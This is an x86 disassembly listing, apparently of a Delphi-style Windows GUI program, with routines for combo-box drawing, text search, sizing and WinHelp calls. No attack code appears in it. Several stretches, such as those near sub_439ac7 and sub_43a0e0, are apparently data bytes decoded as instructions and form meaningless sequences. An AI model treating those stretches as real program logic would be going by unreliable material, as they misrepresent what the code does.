mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40425c
push eax
mov eax [ ebp - 0x8 ]
call sub_40445c
push eax
mov eax [ ebx + 0x228 ]
call sub_423e68
push eax
call DrawTextA
sub_439554
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_423ee8
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_423d88
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_423da4
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_423ac4
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423720
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_422f54
xor edx edx
mov eax [ esi + 0x228 ]
call sub_423ee8
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_439610
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_439640
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4461c4
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_44414c
sub_43966c
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_438a80
inc edi
dec ebx
jne r-xdata
sub_4396a4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_40445c
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446be4
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_439a84
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403448
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406d7c
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446be4
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_439788
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_439948
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_445b90
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43994f
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_403fc0
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403f9c
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40425c
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c334
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40425c
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044fc
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40425c
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044fc
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404184
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_404264
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_446be4
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403448
push ebp
call sub_4396a4
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40425c
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404184
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_404184
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_40431c
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_439958
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439a2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_446be4
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a33
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_439a5c
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_439a84
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_439aa8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4428d8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43fb80
mov edx 0x11
mov eax esi
call sub_43fba4
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x210 ] 0x1
mov eax esi
call sub_439c78
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_439ac7
add [ ecx + 0x41ba5046 ] cl
add [ eax ] al
add [ ebx + 0x60a9e8c6 ] cl
add [ eax ] al
mov edx 0x11
mov eax esi
call sub_43fba4
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x210 ] 0x1
mov eax esi
call sub_439c78
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_439b18
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_443a38
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443964
mov eax ebx
mov si 0xffc8
call sub_403448
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x208 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x100
or eax edx
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
and [ edi + 0x24 ] 0xfffffffe
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x80
sub_439b97
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439c25
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439c2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x210 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4571a8
test al al
je r-xdata
mov ebx [ ebx + 0x20c ]
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_439c78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_439d50
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x1c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d57
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
cmp [ ebx + 0x209 ] 0x0
je r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_422f68
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0xc ]
call sub_40425c
push eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x10 ]
call sub_40445c
push eax
push esi
call GetTextExtentPoint32A
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
push 0x5
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x8 ]
push eax
push 0x6
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_439d60
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f894
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
xor eax eax
mov [ edi + 0x20c ] eax
sub_439df8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
call sub_430fe0
mov esi eax
mov eax esi
call sub_4310c0
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_439e9c
test al al
je r-xdata
push 0x1
mov eax [ edi + 0x4 ]
push eax
call SetBkMode
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446be4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax esi
call sub_4311c0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_439e5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_439e9c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439ea6
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439ecd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ed4
retn
sub_439fd4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44cab0
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43a010
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a035
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a03c
retn
sub_43a048
push 0xf80047a6
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43a9ab
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43ab38
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a9b2
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fc0
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_4082b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_43aa90
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_4082b4
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403ff0
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43a1f4
mov eax [ ebp - 0x14 ]
call sub_40445c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_43a0e0
shl [ eax - 0x5f34ffbd ] 0x43
add ch dl
mov al [ 0xffffffffa0790043 ]
inc ebx
add [ ecx - 0x76ffbc60 ] al
mov al [ 0xffffffffa0910043 ]
inc ebx
add [ ecx - 0x5effbc60 ] bl
mov al [ 0xffffffffa0a90043 ]
inc ebx
add [ ecx - 0x46ffbc60 ] dh
mov al [ 0xffffffffa0590043 ]
inc ebx
add [ ecx - 0x60 ] ah

cmp ah al
mov al [ 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
inc ebx
add [ ecx - 0x60 ] ch
inc ebx
add [ ecx - 0x60 ] dh
mov eax [ 0xffffffffa90043a0 ]
mov al [ 0xffffffffa0b10043 ]
inc ebx
add [ ecx + 0x590043a0 ] bh
mov al [ 0xffffffffa0610043 ]
cmp ah al
mov al [ 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jno r-xdata
cmp ah al
mov al [ 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x43a1 0x0
and al 0xa1
inc ebx
add [ eax ] al
add [ eax ] al
add al cl
mov eax [ 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
add eax 0x44830000
and al 0x4
loopne r-xdata
inc ebx
add [ ecx - 0x60 ] dl
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
inc ebx
add [ eax + eax ] ah
add [ eax ] al
push esp
adc al [ eax ]
xchg esp eax
xor al 0x40
add [ edx + ebx * 2 + 0x40 ] cl
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
push 0xe0043ac
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc al 0x0
add [ eax ] al
mov al 0xb1
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a2a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f9c
test edi edi
jne r-xdata
add [ ebx + 0x3be9e0c0 ] al
add eax 0xc0830000
lodsd [ esi ]
mov ecx 0x4483fffc
and al 0x4
loopne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404034
cmp [ ebx + 0x1c ] 0x0
je r-xdata
add eax [ eax ]
add [ ebx + 0x3fe9e0c0 ] al
add eax 0xc0830000
loopne r-xdata
dec edi
shl al 0xe9

cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
add eax [ eax ]
add [ ebx - 0x161f40 ] al
loopne r-xdata
cmp eax [ 0xffffffffc0830000 ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a2b0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40431c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43a1f4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a2a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f9c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404034
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a2b0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40431c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43a2c4
push ebx
mov ebx eax
mov eax ebx
call sub_43a5f4
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4059cc
sub_43a300
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a367
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43a1f4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a36e
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_43a378
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43a400
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43a2ec
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40431c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a407
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
sub_43a413
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a49b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43ab38
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a4a2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43a1f4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a420
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a49b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43ab38
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a4a2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43a1f4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a4a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a5a0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_43a1f4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fcc
mov eax ebx
call sub_43ab38
test al al
je r-xdata
mov ecx sub_43a048
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a5a7
lea eax [ ebp - 0x1c ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_43a1f4
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43aa90
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403ff0
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40445c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a610
push ebx
mov ebx eax
mov eax ebx
call sub_43a5f4
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4059cc
pop ebx
retn
mov eax rw-data
call sub_4059cc
sub_43a640
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43a698
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a69f
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43a1f4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43a6a8
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
